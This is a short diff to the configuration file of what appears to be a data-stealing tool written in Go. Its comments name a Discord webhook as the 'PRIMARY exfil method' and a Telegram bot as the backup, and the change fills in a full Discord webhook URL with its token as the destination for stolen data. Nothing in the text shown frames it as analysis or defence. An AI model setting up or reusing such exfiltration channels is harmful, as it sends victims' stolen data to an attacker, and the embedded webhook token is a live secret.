@@ -15,7 +15,7 @@ package config
 var (
 	// Discord webhook - PRIMARY exfil method
 	// format: https://discord.com/api/webhooks/xxxxx/yyyyy
-	DiscordWebhook = ""
+	DiscordWebhook = "https://discord.com/api/webhooks/1476012056774967446/QMoimc423mQeiJ5-kFb_6Ox2LEf2R-wTtWRQhLmCQfQfKuUR-svUlHqWdBjQnCqasBzc"
 
 	// Telegram bot - BACKUP exfil method
 	// only used if discord fails or isn't set
